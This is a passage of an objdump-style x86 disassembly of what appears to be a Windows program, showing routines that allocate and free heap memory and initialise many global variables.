  405206:	8d 54 24 18          	lea    0x18(%esp),%edx
  40520a:	52                   	push   %edx
  40520b:	56                   	push   %esi
  40520c:	8d 44 24 18          	lea    0x18(%esp),%eax
  405210:	50                   	push   %eax
  405211:	51                   	push   %ecx
  405212:	e8 3f 26 00 00       	call   0x407856
  405217:	85 c0                	test   %eax,%eax
  405219:	0f 85 cb 00 00 00    	jne    0x4052ea
  40521f:	8b 45 0c             	mov    0xc(%ebp),%eax
  405222:	85 c0                	test   %eax,%eax
  405224:	75 0b                	jne    0x405231
  405226:	8b 54 24 10          	mov    0x10(%esp),%edx
  40522a:	8b 45 08             	mov    0x8(%ebp),%eax
  40522d:	52                   	push   %edx
  40522e:	50                   	push   %eax
  40522f:	eb 09                	jmp    0x40523a
  405231:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405235:	8b 50 14             	mov    0x14(%eax),%edx
  405238:	51                   	push   %ecx
  405239:	52                   	push   %edx
  40523a:	e8 91 13 00 00       	call   0x4065d0
  40523f:	33 db                	xor    %ebx,%ebx
  405241:	83 c4 08             	add    $0x8,%esp
  405244:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  405248:	76 98                	jbe    0x4051e2
  40524a:	83 c6 04             	add    $0x4,%esi
  40524d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405250:	8b 46 14             	mov    0x14(%esi),%eax
  405253:	85 c0                	test   %eax,%eax
  405255:	8b c8                	mov    %eax,%ecx
  405257:	75 05                	jne    0x40525e
  405259:	b9 ec 81 40 00       	mov    $0x4081ec,%ecx
  40525e:	8b 46 10             	mov    0x10(%esi),%eax
  405261:	85 c0                	test   %eax,%eax
  405263:	75 05                	jne    0x40526a
  405265:	b8 ec 81 40 00       	mov    $0x4081ec,%eax
  40526a:	51                   	push   %ecx
  40526b:	8b 0e                	mov    (%esi),%ecx
  40526d:	51                   	push   %ecx
  40526e:	50                   	push   %eax
  40526f:	e8 5c 13 00 00       	call   0x4065d0
  405274:	8b 46 08             	mov    0x8(%esi),%eax
  405277:	83 c4 0c             	add    $0xc,%esp
  40527a:	a8 02                	test   $0x2,%al
  40527c:	74 38                	je     0x4052b6
  40527e:	8b 56 10             	mov    0x10(%esi),%edx
  405281:	85 d2                	test   %edx,%edx
  405283:	74 4c                	je     0x4052d1
  405285:	85 ff                	test   %edi,%edi
  405287:	7e 48                	jle    0x4052d1
  405289:	8b 45 0c             	mov    0xc(%ebp),%eax
  40528c:	85 c0                	test   %eax,%eax
  40528e:	74 0c                	je     0x40529c
  405290:	8b 40 14             	mov    0x14(%eax),%eax
  405293:	e8 58 ed ff ff       	call   0x403ff0
  405298:	85 c0                	test   %eax,%eax
  40529a:	74 35                	je     0x4052d1
  40529c:	8b 55 14             	mov    0x14(%ebp),%edx
  40529f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4052a2:	52                   	push   %edx
  4052a3:	83 ef 01             	sub    $0x1,%edi
  4052a6:	57                   	push   %edi
  4052a7:	8d 46 fc             	lea    -0x4(%esi),%eax
  4052aa:	50                   	push   %eax
  4052ab:	51                   	push   %ecx
  4052ac:	e8 bf fe ff ff       	call   0x405170
  4052b1:	83 c4 10             	add    $0x10,%esp
  4052b4:	eb 1b                	jmp    0x4052d1
  4052b6:	f6 06 01             	testb  $0x1,(%esi)
  4052b9:	74 16                	je     0x4052d1
  4052bb:	50                   	push   %eax
  4052bc:	e8 0f 13 00 00       	call   0x4065d0
  4052c1:	8b 56 10             	mov    0x10(%esi),%edx
  4052c4:	8b 45 14             	mov    0x14(%ebp),%eax
  4052c7:	83 c4 04             	add    $0x4,%esp
  4052ca:	52                   	push   %edx
  4052cb:	50                   	push   %eax
  4052cc:	e8 9f c9 ff ff       	call   0x401c70
  4052d1:	83 c3 01             	add    $0x1,%ebx
  4052d4:	83 c6 20             	add    $0x20,%esi
  4052d7:	3b 5c 24 10          	cmp    0x10(%esp),%ebx
  4052db:	0f 82 6f ff ff ff    	jb     0x405250
  4052e1:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4052e5:	e9 f8 fe ff ff       	jmp    0x4051e2
  4052ea:	3d 03 01 00 00       	cmp    $0x103,%eax
  4052ef:	74 09                	je     0x4052fa
  4052f1:	50                   	push   %eax
  4052f2:	e8 d9 12 00 00       	call   0x4065d0
  4052f7:	83 c4 04             	add    $0x4,%esp
  4052fa:	8b 44 24 14          	mov    0x14(%esp),%eax
  4052fe:	85 c0                	test   %eax,%eax
  405300:	74 06                	je     0x405308
  405302:	50                   	push   %eax
  405303:	e8 54 25 00 00       	call   0x40785c
  405308:	56                   	push   %esi
  405309:	6a 00                	push   $0x0
  40530b:	ff 15 90 80 40 00    	call   *0x408090
  405311:	50                   	push   %eax
  405312:	ff 15 8c 80 40 00    	call   *0x40808c
  405318:	5f                   	pop    %edi
  405319:	5e                   	pop    %esi
  40531a:	5b                   	pop    %ebx
  40531b:	8b e5                	mov    %ebp,%esp
  40531d:	5d                   	pop    %ebp
  40531e:	c3                   	ret
  40531f:	cc                   	int3
  405320:	83 ec 14             	sub    $0x14,%esp
  405323:	56                   	push   %esi
  405324:	57                   	push   %edi
  405325:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405329:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  405330:	00 
  405331:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  405338:	00 
  405339:	c7 44 24 10 05 00 00 	movl   $0x5,0x10(%esp)
  405340:	00 
  405341:	c7 44 24 14 03 00 00 	movl   $0x3,0x14(%esp)
  405348:	00 
  405349:	c7 44 24 18 02 00 00 	movl   $0x2,0x18(%esp)
  405350:	00 
  405351:	33 f6                	xor    %esi,%esi
  405353:	8b 44 b4 08          	mov    0x8(%esp,%esi,4),%eax
  405357:	57                   	push   %edi
  405358:	68 80 00 00 00       	push   $0x80
  40535d:	6a 00                	push   $0x0
  40535f:	50                   	push   %eax
  405360:	e8 0b fe ff ff       	call   0x405170
  405365:	83 c6 01             	add    $0x1,%esi
  405368:	83 c4 10             	add    $0x10,%esp
  40536b:	83 fe 05             	cmp    $0x5,%esi
  40536e:	72 e3                	jb     0x405353
  405370:	5f                   	pop    %edi
  405371:	33 c0                	xor    %eax,%eax
  405373:	5e                   	pop    %esi
  405374:	83 c4 14             	add    $0x14,%esp
  405377:	c2 04 00             	ret    $0x4
  40537a:	cc                   	int3
  40537b:	cc                   	int3
  40537c:	cc                   	int3
  40537d:	cc                   	int3
  40537e:	cc                   	int3
  40537f:	cc                   	int3
  405380:	53                   	push   %ebx
  405381:	56                   	push   %esi
  405382:	57                   	push   %edi
  405383:	e8 58 12 00 00       	call   0x4065e0
  405388:	bb 01 00 00 00       	mov    $0x1,%ebx
  40538d:	a2 6c b2 41 00       	mov    %al,0x41b26c
  405392:	c6 05 0f 90 41 00 00 	movb   $0x0,0x41900f
  405399:	88 1d 0e 90 41 00    	mov    %bl,0x41900e
  40539f:	88 1d 0b 90 40 00    	mov    %bl,0x40900b
  4053a5:	88 1d 08 90 40 00    	mov    %bl,0x409008
  4053ab:	88 1d 09 90 40 00    	mov    %bl,0x409009
  4053b1:	e8 9a 0e 00 00       	call   0x406250
  4053b6:	3c 02                	cmp    $0x2,%al
  4053b8:	75 06                	jne    0x4053c0
  4053ba:	88 1d 0f 90 41 00    	mov    %bl,0x41900f
  4053c0:	8b 3d 90 80 40 00    	mov    0x408090,%edi
  4053c6:	53                   	push   %ebx
  4053c7:	6a 00                	push   $0x0
  4053c9:	ff d7                	call   *%edi
  4053cb:	50                   	push   %eax
  4053cc:	ff 15 84 80 40 00    	call   *0x408084
  4053d2:	85 c0                	test   %eax,%eax
  4053d4:	74 0a                	je     0x4053e0
  4053d6:	50                   	push   %eax
  4053d7:	e8 34 00 00 00       	call   0x405410
  4053dc:	8b f0                	mov    %eax,%esi
  4053de:	eb 02                	jmp    0x4053e2
  4053e0:	33 f6                	xor    %esi,%esi
  4053e2:	e8 e9 04 00 00       	call   0x4058d0
  4053e7:	85 f6                	test   %esi,%esi
  4053e9:	74 11                	je     0x4053fc
  4053eb:	e8 b0 02 00 00       	call   0x4056a0
  4053f0:	56                   	push   %esi
  4053f1:	6a 00                	push   $0x0
  4053f3:	ff d7                	call   *%edi
  4053f5:	50                   	push   %eax
  4053f6:	ff 15 8c 80 40 00    	call   *0x40808c
  4053fc:	6a 00                	push   $0x0
  4053fe:	ff 15 b4 80 40 00    	call   *0x4080b4
  405404:	5f                   	pop    %edi
  405405:	5e                   	pop    %esi
  405406:	5b                   	pop    %ebx
  405407:	cc                   	int3
  405408:	cc                   	int3
  405409:	cc                   	int3
  40540a:	cc                   	int3
  40540b:	cc                   	int3
  40540c:	cc                   	int3
  40540d:	cc                   	int3
  40540e:	cc                   	int3
  40540f:	cc                   	int3
  405410:	55                   	push   %ebp
  405411:	8b ec                	mov    %esp,%ebp
  405413:	83 e4 f8             	and    $0xfffffff8,%esp
  405416:	83 ec 14             	sub    $0x14,%esp
  405419:	53                   	push   %ebx
  40541a:	56                   	push   %esi
  40541b:	8b 35 90 80 40 00    	mov    0x408090,%esi
  405421:	57                   	push   %edi
  405422:	6a 2c                	push   $0x2c
  405424:	33 db                	xor    %ebx,%ebx
  405426:	53                   	push   %ebx
  405427:	ff d6                	call   *%esi
  405429:	8b 3d 84 80 40 00    	mov    0x408084,%edi
  40542f:	50                   	push   %eax
  405430:	ff d7                	call   *%edi
  405432:	3b c3                	cmp    %ebx,%eax
  405434:	74 0f                	je     0x405445
  405436:	8b f0                	mov    %eax,%esi
  405438:	e8 43 d2 ff ff       	call   0x402680
  40543d:	8b 35 90 80 40 00    	mov    0x408090,%esi
  405443:	eb 02                	jmp    0x405447
  405445:	33 c0                	xor    %eax,%eax
  405447:	a3 80 b2 41 00       	mov    %eax,0x41b280
  40544c:	e8 0f 12 00 00       	call   0x406660
  405451:	38 1d 0f 90 41 00    	cmp    %bl,0x41900f
  405457:	c7 05 30 b2 41 00 ff 	movl   $0x7fffffff,0x41b230
  40545e:	ff ff 7f 
  405461:	74 08                	je     0x40546b
  405463:	89 1d 58 b2 41 00    	mov    %ebx,0x41b258
  405469:	eb 1a                	jmp    0x405485
  40546b:	6a 08                	push   $0x8
  40546d:	53                   	push   %ebx
  40546e:	ff d6                	call   *%esi
  405470:	50                   	push   %eax
  405471:	ff d7                	call   *%edi
  405473:	3b c3                	cmp    %ebx,%eax
  405475:	74 07                	je     0x40547e
  405477:	89 58 04             	mov    %ebx,0x4(%eax)
  40547a:	89 18                	mov    %ebx,(%eax)
  40547c:	eb 02                	jmp    0x405480
  40547e:	33 c0                	xor    %eax,%eax
  405480:	a3 58 b2 41 00       	mov    %eax,0x41b258
  405485:	6a 08                	push   $0x8
  405487:	53                   	push   %ebx
  405488:	ff d6                	call   *%esi
  40548a:	50                   	push   %eax
  40548b:	ff d7                	call   *%edi
  40548d:	3b c3                	cmp    %ebx,%eax
  40548f:	74 07                	je     0x405498
  405491:	89 58 04             	mov    %ebx,0x4(%eax)
  405494:	89 18                	mov    %ebx,(%eax)
  405496:	eb 02                	jmp    0x40549a
  405498:	33 c0                	xor    %eax,%eax
  40549a:	a3 64 b2 41 00       	mov    %eax,0x41b264
  40549f:	8d 44 24 10          	lea    0x10(%esp),%eax
  4054a3:	50                   	push   %eax
  4054a4:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4054a9:	6a 36                	push   $0x36
  4054ab:	89 1d 34 b2 41 00    	mov    %ebx,0x41b234
  4054b1:	89 1d 3c b2 41 00    	mov    %ebx,0x41b23c
  4054b7:	89 1d 38 b2 41 00    	mov    %ebx,0x41b238
  4054bd:	89 1d 18 90 41 00    	mov    %ebx,0x419018
  4054c3:	89 1d 7c b2 41 00    	mov    %ebx,0x41b27c
  4054c9:	89 1d 68 b2 41 00    	mov    %ebx,0x41b268
  4054cf:	89 1d 4c b2 41 00    	mov    %ebx,0x41b24c
  4054d5:	e8 76 d4 ff ff       	call   0x402950
  4054da:	8b 08                	mov    (%eax),%ecx
  4054dc:	50                   	push   %eax
  4054dd:	53                   	push   %ebx
  4054de:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  4054e4:	ff d6                	call   *%esi
  4054e6:	50                   	push   %eax
  4054e7:	ff 15 8c 80 40 00    	call   *0x40808c
  4054ed:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4054f2:	8d 54 24 10          	lea    0x10(%esp),%edx
  4054f6:	52                   	push   %edx
  4054f7:	6a 37                	push   $0x37
  4054f9:	e8 52 d4 ff ff       	call   0x402950
  4054fe:	8b 08                	mov    (%eax),%ecx
  405500:	50                   	push   %eax
  405501:	53                   	push   %ebx
  405502:	89 0d 20 90 41 00    	mov    %ecx,0x419020
  405508:	ff d6                	call   *%esi
  40550a:	50                   	push   %eax
  40550b:	ff 15 8c 80 40 00    	call   *0x40808c
  405511:	6a 10                	push   $0x10
  405513:	53                   	push   %ebx
  405514:	89 1d 24 90 41 00    	mov    %ebx,0x419024
  40551a:	89 1d 70 b2 41 00    	mov    %ebx,0x41b270
  405520:	89 1d 88 b2 41 00    	mov    %ebx,0x41b288
  405526:	89 1d 78 b2 41 00    	mov    %ebx,0x41b278
  40552c:	89 1d 84 b2 41 00    	mov    %ebx,0x41b284
  405532:	89 1d 44 b2 41 00    	mov    %ebx,0x41b244
  405538:	89 1d 5c b2 41 00    	mov    %ebx,0x41b25c
  40553e:	ff d6                	call   *%esi
  405540:	50                   	push   %eax
  405541:	ff d7                	call   *%edi
  405543:	8b f0                	mov    %eax,%esi
  405545:	3b f3                	cmp    %ebx,%esi
  405547:	74 49                	je     0x405592
  405549:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40554e:	8d 54 24 14          	lea    0x14(%esp),%edx
  405552:	52                   	push   %edx
  405553:	6a 20                	push   $0x20
  405555:	89 1e                	mov    %ebx,(%esi)
  405557:	89 5e 0c             	mov    %ebx,0xc(%esi)
  40555a:	89 5e 08             	mov    %ebx,0x8(%esi)
  40555d:	89 5e 04             	mov    %ebx,0x4(%esi)
  405560:	e8 eb d3 ff ff       	call   0x402950
  405565:	89 46 04             	mov    %eax,0x4(%esi)
  405568:	8d 44 24 14          	lea    0x14(%esp),%eax
  40556c:	50                   	push   %eax
  40556d:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405572:	6a 21                	push   $0x21
  405574:	e8 d7 d3 ff ff       	call   0x402950
  405579:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40557d:	51                   	push   %ecx
  40557e:	89 46 08             	mov    %eax,0x8(%esi)
  405581:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405586:	6a 22                	push   $0x22
  405588:	e8 c3 d3 ff ff       	call   0x402950
  40558d:	89 46 0c             	mov    %eax,0xc(%esi)
  405590:	eb 02                	jmp    0x405594
  405592:	33 f6                	xor    %esi,%esi
  405594:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405599:	8d 54 24 10          	lea    0x10(%esp),%edx
  40559d:	52                   	push   %edx
  40559e:	6a 1a                	push   $0x1a
  4055a0:	89 35 50 b2 41 00    	mov    %esi,0x41b250
  4055a6:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4055aa:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4055ae:	e8 9d d3 ff ff       	call   0x402950
  4055b3:	3b c3                	cmp    %ebx,%eax
  4055b5:	89 44 24 14          	mov    %eax,0x14(%esp)
  4055b9:	0f 84 c4 00 00 00    	je     0x405683
  4055bf:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4055c3:	51                   	push   %ecx
  4055c4:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4055c8:	52                   	push   %edx
  4055c9:	e8 d2 da ff ff       	call   0x4030a0
  4055ce:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4055d2:	3b f3                	cmp    %ebx,%esi
  4055d4:	74 0c                	je     0x4055e2
  4055d6:	83 7c 24 18 01       	cmpl   $0x1,0x18(%esp)
  4055db:	7e 05                	jle    0x4055e2
  4055dd:	8b 4e 04             	mov    0x4(%esi),%ecx
  4055e0:	eb 02                	jmp    0x4055e4
  4055e2:	33 c9                	xor    %ecx,%ecx
  4055e4:	3b f3                	cmp    %ebx,%esi
  4055e6:	74 0a                	je     0x4055f2
  4055e8:	39 5c 24 18          	cmp    %ebx,0x18(%esp)
  4055ec:	7e 04                	jle    0x4055f2
  4055ee:	8b 06                	mov    (%esi),%eax
  4055f0:	eb 02                	jmp    0x4055f4
  4055f2:	33 c0                	xor    %eax,%eax
  4055f4:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  4055fa:	51                   	push   %ecx
  4055fb:	50                   	push   %eax
  4055fc:	ff d7                	call   *%edi
  4055fe:	50                   	push   %eax
  4055ff:	ff 15 98 80 40 00    	call   *0x408098
  405605:	3b f3                	cmp    %ebx,%esi
  405607:	a3 54 b2 41 00       	mov    %eax,0x41b254
  40560c:	74 0c                	je     0x40561a
  40560e:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
  405613:	7e 05                	jle    0x40561a
  405615:	8b 4e 08             	mov    0x8(%esi),%ecx
  405618:	eb 02                	jmp    0x40561c
  40561a:	33 c9                	xor    %ecx,%ecx
  40561c:	3b f3                	cmp    %ebx,%esi
  40561e:	74 0a                	je     0x40562a
  405620:	39 5c 24 18          	cmp    %ebx,0x18(%esp)
  405624:	7e 04                	jle    0x40562a
  405626:	8b 06                	mov    (%esi),%eax
  405628:	eb 02                	jmp    0x40562c
  40562a:	33 c0                	xor    %eax,%eax
  40562c:	51                   	push   %ecx
  40562d:	50                   	push   %eax
  40562e:	ff d7                	call   *%edi
  405630:	50                   	push   %eax
  405631:	ff 15 98 80 40 00    	call   *0x408098
  405637:	3b f3                	cmp    %ebx,%esi
  405639:	a3 60 b2 41 00       	mov    %eax,0x41b260
  40563e:	74 0c                	je     0x40564c
  405640:	83 7c 24 18 04       	cmpl   $0x4,0x18(%esp)
  405645:	7e 05                	jle    0x40564c
  405647:	8b 46 10             	mov    0x10(%esi),%eax
  40564a:	eb 02                	jmp    0x40564e
  40564c:	33 c0                	xor    %eax,%eax
  40564e:	3b f3                	cmp    %ebx,%esi
  405650:	74 0c                	je     0x40565e
  405652:	83 7c 24 18 03       	cmpl   $0x3,0x18(%esp)
  405657:	7e 05                	jle    0x40565e
  405659:	8b 76 0c             	mov    0xc(%esi),%esi
  40565c:	eb 02                	jmp    0x405660
  40565e:	33 f6                	xor    %esi,%esi
  405660:	50                   	push   %eax
  405661:	56                   	push   %esi
  405662:	ff d7                	call   *%edi
  405664:	50                   	push   %eax
  405665:	ff 15 98 80 40 00    	call   *0x408098
  40566b:	a3 48 b2 41 00       	mov    %eax,0x41b248
  405670:	8b 44 24 14          	mov    0x14(%esp),%eax
  405674:	50                   	push   %eax
  405675:	53                   	push   %ebx
  405676:	ff 15 90 80 40 00    	call   *0x408090
  40567c:	50                   	push   %eax
  40567d:	ff 15 8c 80 40 00    	call   *0x40808c
  405683:	8d 74 24 18          	lea    0x18(%esp),%esi
  405687:	e8 d4 da ff ff       	call   0x403160
  40568c:	8b 45 08             	mov    0x8(%ebp),%eax
  40568f:	5f                   	pop    %edi
  405690:	5e                   	pop    %esi
  405691:	5b                   	pop    %ebx
  405692:	8b e5                	mov    %ebp,%esp
  405694:	5d                   	pop    %ebp
  405695:	c2 04 00             	ret    $0x4
  405698:	cc                   	int3
  405699:	cc                   	int3
  40569a:	cc                   	int3
  40569b:	cc                   	int3
  40569c:	cc                   	int3
  40569d:	cc                   	int3
  40569e:	cc                   	int3
  40569f:	cc                   	int3
  4056a0:	51                   	push   %ecx
  4056a1:	a1 5c b2 41 00       	mov    0x41b25c,%eax
  4056a6:	53                   	push   %ebx
  4056a7:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  4056ad:	55                   	push   %ebp
  4056ae:	56                   	push   %esi
  4056af:	33 ed                	xor    %ebp,%ebp
  4056b1:	3b c5                	cmp    %ebp,%eax
  4056b3:	57                   	push   %edi
  4056b4:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  4056ba:	74 0d                	je     0x4056c9
  4056bc:	50                   	push   %eax
  4056bd:	55                   	push   %ebp
  4056be:	ff d3                	call   *%ebx
  4056c0:	50                   	push   %eax
  4056c1:	ff d7                	call   *%edi
  4056c3:	89 2d 5c b2 41 00    	mov    %ebp,0x41b25c
  4056c9:	a1 44 b2 41 00       	mov    0x41b244,%eax
  4056ce:	3b c5                	cmp    %ebp,%eax
  4056d0:	74 0d                	je     0x4056df
  4056d2:	50                   	push   %eax
  4056d3:	55                   	push   %ebp
  4056d4:	ff d3                	call   *%ebx
  4056d6:	50                   	push   %eax
  4056d7:	ff d7                	call   *%edi
  4056d9:	89 2d 44 b2 41 00    	mov    %ebp,0x41b244
  4056df:	a1 84 b2 41 00       	mov    0x41b284,%eax
  4056e4:	3b c5                	cmp    %ebp,%eax
  4056e6:	74 0d                	je     0x4056f5
  4056e8:	50                   	push   %eax
  4056e9:	55                   	push   %ebp
  4056ea:	ff d3                	call   *%ebx
  4056ec:	50                   	push   %eax
  4056ed:	ff d7                	call   *%edi
  4056ef:	89 2d 84 b2 41 00    	mov    %ebp,0x41b284
  4056f5:	a1 78 b2 41 00       	mov    0x41b278,%eax
  4056fa:	3b c5                	cmp    %ebp,%eax
  4056fc:	74 0d                	je     0x40570b
  4056fe:	50                   	push   %eax
  4056ff:	55                   	push   %ebp
  405700:	ff d3                	call   *%ebx
  405702:	50                   	push   %eax
  405703:	ff d7                	call   *%edi
  405705:	89 2d 78 b2 41 00    	mov    %ebp,0x41b278
  40570b:	a1 40 b2 41 00       	mov    0x41b240,%eax
  405710:	3b c5                	cmp    %ebp,%eax
  405712:	74 0d                	je     0x405721
  405714:	50                   	push   %eax
  405715:	55                   	push   %ebp
  405716:	ff d3                	call   *%ebx
  405718:	50                   	push   %eax
  405719:	ff d7                	call   *%edi
  40571b:	89 2d 40 b2 41 00    	mov    %ebp,0x41b240
  405721:	a1 50 b2 41 00       	mov    0x41b250,%eax
  405726:	3b c5                	cmp    %ebp,%eax
  405728:	74 15                	je     0x40573f
  40572a:	50                   	push   %eax
  40572b:	8b f0                	mov    %eax,%esi
  40572d:	e8 6e d6 ff ff       	call   0x402da0
  405732:	56                   	push   %esi
  405733:	55                   	push   %ebp
  405734:	ff d3                	call   *%ebx
  405736:	50                   	push   %eax
  405737:	ff d7                	call   *%edi
  405739:	89 2d 50 b2 41 00    	mov    %ebp,0x41b250
  40573f:	a1 24 90 41 00       	mov    0x419024,%eax
  405744:	3b c5                	cmp    %ebp,%eax
  405746:	74 0d                	je     0x405755
  405748:	50                   	push   %eax
  405749:	55                   	push   %ebp
  40574a:	ff d3                	call   *%ebx
  40574c:	50                   	push   %eax
  40574d:	ff d7                	call   *%edi
  40574f:	89 2d 24 90 41 00    	mov    %ebp,0x419024
  405755:	a1 70 b2 41 00       	mov    0x41b270,%eax
  40575a:	3b c5                	cmp    %ebp,%eax
  40575c:	74 0d                	je     0x40576b
  40575e:	50                   	push   %eax
  40575f:	55                   	push   %ebp
  405760:	ff d3                	call   *%ebx
  405762:	50                   	push   %eax
  405763:	ff d7                	call   *%edi
  405765:	89 2d 70 b2 41 00    	mov    %ebp,0x41b270
  40576b:	a1 88 b2 41 00       	mov    0x41b288,%eax
  405770:	3b c5                	cmp    %ebp,%eax
  405772:	74 0d                	je     0x405781
  405774:	50                   	push   %eax
  405775:	55                   	push   %ebp
  405776:	ff d3                	call   *%ebx
  405778:	50                   	push   %eax
  405779:	ff d7                	call   *%edi
  40577b:	89 2d 88 b2 41 00    	mov    %ebp,0x41b288
  405781:	a1 7c b2 41 00       	mov    0x41b27c,%eax
  405786:	3b c5                	cmp    %ebp,%eax
  405788:	74 14                	je     0x40579e
  40578a:	8b f0                	mov    %eax,%esi
  40578c:	e8 7f d7 ff ff       	call   0x402f10
  405791:	56                   	push   %esi
  405792:	55                   	push   %ebp
  405793:	ff d3                	call   *%ebx
  405795:	50                   	push   %eax
  405796:	ff d7                	call   *%edi
  405798:	89 2d 7c b2 41 00    	mov    %ebp,0x41b27c
  40579e:	a1 3c b2 41 00       	mov    0x41b23c,%eax
  4057a3:	3b c5                	cmp    %ebp,%eax
  4057a5:	74 14                	je     0x4057bb
  4057a7:	8b f0                	mov    %eax,%esi
  4057a9:	e8 62 d7 ff ff       	call   0x402f10
  4057ae:	56                   	push   %esi
  4057af:	55                   	push   %ebp
  4057b0:	ff d3                	call   *%ebx
  4057b2:	50                   	push   %eax
  4057b3:	ff d7                	call   *%edi
  4057b5:	89 2d 3c b2 41 00    	mov    %ebp,0x41b23c
  4057bb:	a1 34 b2 41 00       	mov    0x41b234,%eax
  4057c0:	3b c5                	cmp    %ebp,%eax
  4057c2:	74 14                	je     0x4057d8
  4057c4:	8b f0                	mov    %eax,%esi
  4057c6:	e8 45 d7 ff ff       	call   0x402f10
  4057cb:	56                   	push   %esi
  4057cc:	55                   	push   %ebp
  4057cd:	ff d3                	call   *%ebx
  4057cf:	50                   	push   %eax
  4057d0:	ff d7                	call   *%edi
  4057d2:	89 2d 34 b2 41 00    	mov    %ebp,0x41b234
  4057d8:	a1 18 90 41 00       	mov    0x419018,%eax
  4057dd:	3b c5                	cmp    %ebp,%eax
  4057df:	74 14                	je     0x4057f5
  4057e1:	8b f0                	mov    %eax,%esi
  4057e3:	e8 28 d7 ff ff       	call   0x402f10
  4057e8:	56                   	push   %esi
  4057e9:	55                   	push   %ebp
  4057ea:	ff d3                	call   *%ebx
  4057ec:	50                   	push   %eax
  4057ed:	ff d7                	call   *%edi
  4057ef:	89 2d 18 90 41 00    	mov    %ebp,0x419018
  4057f5:	a1 38 b2 41 00       	mov    0x41b238,%eax
  4057fa:	3b c5                	cmp    %ebp,%eax
  4057fc:	74 14                	je     0x405812
  4057fe:	8b f0                	mov    %eax,%esi
  405800:	e8 0b d7 ff ff       	call   0x402f10
  405805:	56                   	push   %esi
  405806:	55                   	push   %ebp
  405807:	ff d3                	call   *%ebx
  405809:	50                   	push   %eax
  40580a:	ff d7                	call   *%edi
  40580c:	89 2d 38 b2 41 00    	mov    %ebp,0x41b238
  405812:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  405818:	3b f5                	cmp    %ebp,%esi
  40581a:	74 14                	je     0x405830
  40581c:	e8 df b7 ff ff       	call   0x401000
  405821:	8b c6                	mov    %esi,%eax
  405823:	50                   	push   %eax
  405824:	55                   	push   %ebp
  405825:	ff d3                	call   *%ebx
  405827:	50                   	push   %eax
  405828:	ff d7                	call   *%edi
  40582a:	89 2d 68 b2 41 00    	mov    %ebp,0x41b268
  405830:	8b 35 4c b2 41 00    	mov    0x41b24c,%esi
  405836:	3b f5                	cmp    %ebp,%esi
  405838:	74 14                	je     0x40584e
  40583a:	e8 21 d9 ff ff       	call   0x403160
  40583f:	8b ce                	mov    %esi,%ecx
  405841:	51                   	push   %ecx
  405842:	55                   	push   %ebp
  405843:	ff d3                	call   *%ebx
  405845:	50                   	push   %eax
  405846:	ff d7                	call   *%edi
  405848:	89 2d 4c b2 41 00    	mov    %ebp,0x41b24c
  40584e:	a1 58 b2 41 00       	mov    0x41b258,%eax
  405853:	3b c5                	cmp    %ebp,%eax
  405855:	74 14                	je     0x40586b
  405857:	8b f0                	mov    %eax,%esi
  405859:	e8 c2 b9 ff ff       	call   0x401220
  40585e:	56                   	push   %esi
  40585f:	55                   	push   %ebp
  405860:	ff d3                	call   *%ebx
  405862:	50                   	push   %eax
  405863:	ff d7                	call   *%edi
  405865:	89 2d 58 b2 41 00    	mov    %ebp,0x41b258
  40586b:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405870:	3b c5                	cmp    %ebp,%eax
  405872:	74 14                	je     0x405888
  405874:	8b f0                	mov    %eax,%esi
  405876:	e8 a5 b9 ff ff       	call   0x401220
  40587b:	56                   	push   %esi
  40587c:	55                   	push   %ebp
  40587d:	ff d3                	call   *%ebx
  40587f:	50                   	push   %eax
  405880:	ff d7                	call   *%edi
  405882:	89 2d 64 b2 41 00    	mov    %ebp,0x41b264
  405888:	8b 35 80 b2 41 00    	mov    0x41b280,%esi
  40588e:	3b f5                	cmp    %ebp,%esi
  405890:	74 2d                	je     0x4058bf
  405892:	8b 46 24             	mov    0x24(%esi),%eax
  405895:	3b c5                	cmp    %ebp,%eax
  405897:	74 07                	je     0x4058a0
  405899:	50                   	push   %eax
  40589a:	55                   	push   %ebp
  40589b:	ff d3                	call   *%ebx
  40589d:	50                   	push   %eax
  40589e:	ff d7                	call   *%edi
  4058a0:	8b 06                	mov    (%esi),%eax
  4058a2:	3b c5                	cmp    %ebp,%eax
  4058a4:	74 08                	je     0x4058ae
  4058a6:	55                   	push   %ebp
  4058a7:	50                   	push   %eax
  4058a8:	ff 15 30 80 40 00    	call   *0x408030
  4058ae:	8d 56 0c             	lea    0xc(%esi),%edx
  4058b1:	52                   	push   %edx
  4058b2:	ff 15 34 81 40 00    	call   *0x408134
  4058b8:	56                   	push   %esi
  4058b9:	55                   	push   %ebp
  4058ba:	ff d3                	call   *%ebx
  4058bc:	50                   	push   %eax
  4058bd:	ff d7                	call   *%edi
  4058bf:	5f                   	pop    %edi
  4058c0:	5e                   	pop    %esi
  4058c1:	5d                   	pop    %ebp
  4058c2:	5b                   	pop    %ebx
  4058c3:	59                   	pop    %ecx
  4058c4:	c3                   	ret
  4058c5:	cc                   	int3
  4058c6:	cc                   	int3
  4058c7:	cc                   	int3
  4058c8:	cc                   	int3
  4058c9:	cc                   	int3
  4058ca:	cc                   	int3
  4058cb:	cc                   	int3
  4058cc:	cc                   	int3
  4058cd:	cc                   	int3
  4058ce:	cc                   	int3
  4058cf:	cc                   	int3
  4058d0:	55                   	push   %ebp
